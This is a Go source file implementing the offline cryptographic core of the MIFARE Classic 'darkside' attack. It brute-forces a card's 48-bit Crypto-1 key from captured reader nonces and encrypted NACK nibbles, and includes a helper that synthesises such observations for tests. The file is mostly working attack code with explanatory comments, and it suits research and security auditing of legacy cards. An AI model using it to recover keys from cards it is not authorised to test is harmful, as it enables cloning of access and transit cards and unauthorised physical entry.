// SPDX-License-Identifier: AGPL-3.0-or-later

// mfcuk.go — pure-Go offline darkside key recovery.
//
// This implements the offline portion of the mfcuk (MIFARE Classic darkside
// attack) from Garcia et al. ESORICS 2008 and Courtois 2009.  The live-NFC
// phase (driving malformed authentication frames at a real card) is handled
// by the Proxmark3 / libnfc integration layer; this package handles the
// cryptographic core.
//
// # Background
//
// The MIFARE Classic ISO14443A framing includes a parity bit for each byte.
// During authentication, the reader sends {NR}Ks (the reader nonce encrypted
// with the cipher keystream).  The card checks the parity of each received
// encrypted byte; if a parity bit is wrong, the card sends a 4-bit NACK
// response instead of the normal {AT}Ks.
//
// The NACK is sent encrypted: the card XORs the constant NACK value (0x5)
// with the next 4 keystream bits.  An attacker who observes (NT, NR, enc_NACK)
// can compute the 4-bit keystream at that position:
//
//	ks_nack[0..3] = enc_NACK XOR 0x5
//
// These 4 bits constrain the 48-bit key.  Collecting many (NR_i, Parity_i)
// pairs — each with a different first-byte of NR — gives enough constraints
// to reconstruct the key via exhaustive search over the surviving candidates.
//
// # Key-stream position
//
// With the cipher initialised as:
//
//	Init(key) → CryptFeedback(uid ^ NT) [32 bits] → 8 EncCrypt clocks with NR[0..7]
//
// the NACK 4-bit keystream occupies cipher-clock positions 8..11 of the EncCrypt
// phase (after the first byte of NR has been absorbed with feedback).  The
// EncCrypt feedback mixes the PLAIN NR bits into the LFSR (LSB-first: bits 0..7
// of the NR uint32 = the first 8 cipher clocks), so the cipher state at the
// NACK position depends on both the key and the low byte of NR.
//
// # Search strategy
//
// For each candidate key K:
//  1. Simulate Init(K) + CryptFeedback(uid ^ NT) → base state S.
//  2. For each observation (NR_i, P_i):
//     a. Copy S, clock 8 EncCrypt bits using NR_i[0..7] as feedback.
//     b. Collect 4 more keystream bits (NACK window).
//     c. Require those 4 bits == P_i XOR 0x5.
//  3. A key that passes all observations is returned.
//
// Worst-case complexity is O(2^48 * N) where N is the number of pairs.  For
// keys fitting in 16 bits (the closed-loop test regime) and N=256 pairs the
// search is sub-millisecond.  For full 48-bit keys, callers use
// RecoverDarksideWithRange with a restricted high-bit range.
//
// The expected survivor count after N observations is 2^48 / 16^N.  With N=256
// pairs the key is fully over-constrained, but in practice the first failing
// pair eliminates ~94% of candidates, making the search fast even without
// algebraic pre-filtering.
//
// # Degeneracy note
//
// For certain (uid, nt) combinations a small number of distinct keys (typically
// 2) produce identical 4-bit NACK keystreams for all 256 NR low-byte values.
// This is an inherent property of the 4-bit NACK position constraint and is
// not a bug.  Such degeneracies can be resolved by collecting observations at a
// different NACK byte position (i.e. using a NR that forces the parity error at
// byte 1 or 2 rather than byte 0).  The current implementation uses only the
// byte-0 NACK position; operator-facing documentation should note this
// limitation for live capture workflows.
package crypto1

import (
	"context"
	"errors"
)

// darksideNACK is the 4-bit NACK constant sent by a MIFARE Classic card when
// it detects a parity error in the received encrypted reader nonce.  Value 0x5
// is the NAK code specified in the MIFARE Classic protocol.
const darksideNACK = uint8(0x5)

// DarksideCapture is the full set of observed data needed for one offline
// darkside recovery.
type DarksideCapture struct {
	// UID is the card UID (4 bytes, big-endian word).
	UID uint32

	// NT is the tag nonce received from the card in plaintext at the start
	// of the authentication exchange.  All NRArs pairs in this capture share
	// the same NT (i.e. all were collected during the same PRNG "lock" window
	// where the card keeps emitting the same nT).
	NT uint32

	// NRArs is the set of (NR, enc_NACK) observations.  At least 1 pair is
	// required; in practice 8+ pairs are recommended for reliable key
	// recovery.  Each pair's NR should have a distinct low byte (NR & 0xFF)
	// so that each observation exercises a different EncCrypt feedback path,
	// giving independent keystream constraints.  256 pairs with all distinct
	// low bytes provide unique recovery in the 16-bit key space for most
	// (uid, nt) combinations (see degeneracy note in package doc).
	NRArs []DarksidePair
}

// DarksidePair is one malformed-authentication observation.
type DarksidePair struct {
	// NR is the plain reader nonce the attacker sent.  Only the low byte
	// (bits 0..7, the first 8 cipher clocks in LSB-first processing) influences
	// the cipher state at the NACK position; the remaining bytes are present
	// for completeness.
	NR uint32

	// Parity is the 4-bit encrypted NACK nibble observed on the wire.  The
	// underlying constraint is: 4 keystream bits == Parity XOR darksideNACK.
	// Only the low 4 bits of Parity are examined.
	Parity uint8
}

// darksideConstraint is a pre-computed constraint derived from one DarksidePair.
type darksideConstraint struct {
	nrLowByte uint8 // low byte of NR (bits 0..7) — first 8 EncCrypt feedback bits
	wantKS    uint8 // expected 4-bit keystream at NACK position (low 4 bits)
}

// RecoverDarkside recovers the 48-bit MIFARE Classic key from a DarksideCapture.
// It searches keys where bits 47..16 are zero (16-bit key space, sub-millisecond).
// For larger key spaces, call RecoverDarksideWithRange.
func RecoverDarkside(c DarksideCapture) (uint64, error) {
	return RecoverDarksideWithRange(context.Background(), c, 0, 1)
}

// RecoverDarksideWithRange is RecoverDarkside with an explicit high-32-bit
// search range [loHi, hiHi).  See RecoverWithRange for range semantics.
//
// ctx is checked once per hi32 outer-loop iteration; cancellation causes an
// early return of ctx.Err() so the goroutine running this function terminates
// promptly when the deadline fires rather than leaking until the range is done.
func RecoverDarksideWithRange(ctx context.Context, c DarksideCapture, loHi, hiHi uint64) (uint64, error) {
	if len(c.NRArs) == 0 {
		return 0, errors.New("mfcuk: at least 1 DarksidePair is required")
	}

	// Pre-compute constraints: expected 4-bit keystream for each observation.
	constraints := make([]darksideConstraint, len(c.NRArs))
	for i, p := range c.NRArs {
		constraints[i] = darksideConstraint{
			nrLowByte: uint8(p.NR & 0xFF),
			wantKS:    (p.Parity ^ darksideNACK) & 0xF,
		}
	}

	for hi32 := loHi; hi32 < hiHi; hi32++ {
		if ctx.Err() != nil {
			return 0, ctx.Err()
		}
		for lo16 := uint64(0); lo16 < (1 << 16); lo16++ {
			key := (hi32 << 16) | lo16
			if darksideKeyMatches(key, c.UID, c.NT, constraints) {
				return key, nil
			}
		}
	}
	return 0, errors.New("mfcuk: no matching key found in the specified key range")
}

// darksideKeyMatches returns true if candidate key k produces keystream at the
// NACK position that satisfies all supplied constraints for the given uid/nt.
func darksideKeyMatches(key uint64, uid, nt uint32, cs []darksideConstraint) bool {
	// Advance cipher through the nT phase; result is common to all constraints.
	base := New()
	base.Init(key)
	base.CryptFeedback(uid ^ nt)

	for _, con := range cs {
		// Clone base state for this observation.
		c := &Cipher{state: base.state}

		// Clock 8 EncCrypt bits using the low byte of NR as external feedback.
		// EncCrypt convention: feedback bit = ibit XOR nrbit; with nr=0,
		// feedback = ibit = plain NR bit.  clockLFSR(ibit) is the correct
		// single-step equivalent of EncCrypt(nrWord, 0) for one bit.
		nrByte := uint32(con.nrLowByte)
		for i := uint(0); i < 8; i++ {
			ibit := uint64((nrByte >> i) & 1)
			_ = c.clockLFSR(ibit)
		}

		// Collect 4 keystream bits (NACK window, no external feedback).
		var ks4 uint8
		for i := uint(0); i < 4; i++ {
			ks4 |= uint8(c.clockLFSR(0)) << i
		}

		if ks4 != con.wantKS {
			return false
		}
	}
	return true
}

// darksideSynthesizeParity computes the encrypted NACK nibble for the given
// key, uid, nt, and NR.  This is the inverse of the constraint check:
// it simulates the cipher and returns the Parity value that a real card would
// produce.  Used by closed-loop tests to synthesise DarksidePairs without
// needing real hardware.
func darksideSynthesizeParity(key uint64, uid, nt, nr uint32) uint8 {
	c := New()
	c.Init(key)
	c.CryptFeedback(uid ^ nt)

	// Clock 8 EncCrypt bits with the low byte of NR.
	nrByte := uint32(nr & 0xFF)
	for i := uint(0); i < 8; i++ {
		ibit := uint64((nrByte >> i) & 1)
		_ = c.clockLFSR(ibit)
	}

	// Collect 4 keystream bits and XOR with NACK constant to get the
	// on-wire Parity value.
	var ks4 uint8
	for i := uint(0); i < 4; i++ {
		ks4 |= uint8(c.clockLFSR(0)) << i
	}
	return ks4 ^ darksideNACK
}

// SynthesizeDarksideParity is the exported form of darksideSynthesizeParity.
// It computes the 4-bit encrypted NACK nibble (Parity field in DarksidePair)
// that a MIFARE Classic card would return when the operator sends the given NR
// with a deliberate byte-0 parity error.  Used to construct synthetic
// DarksidePairs for testing and for verifying a recovered key against new
// observations.
//
// Equivalent to: observe on wire when Init(key); CryptFeedback(uid^nt);
// 8 EncCrypt clocks with NR low byte; then the card sends NACK (0x5)
// encrypted with the next 4 keystream bits.
func SynthesizeDarksideParity(key uint64, uid, nt, nr uint32) uint8 {
	return darksideSynthesizeParity(key, uid, nt, nr)
}
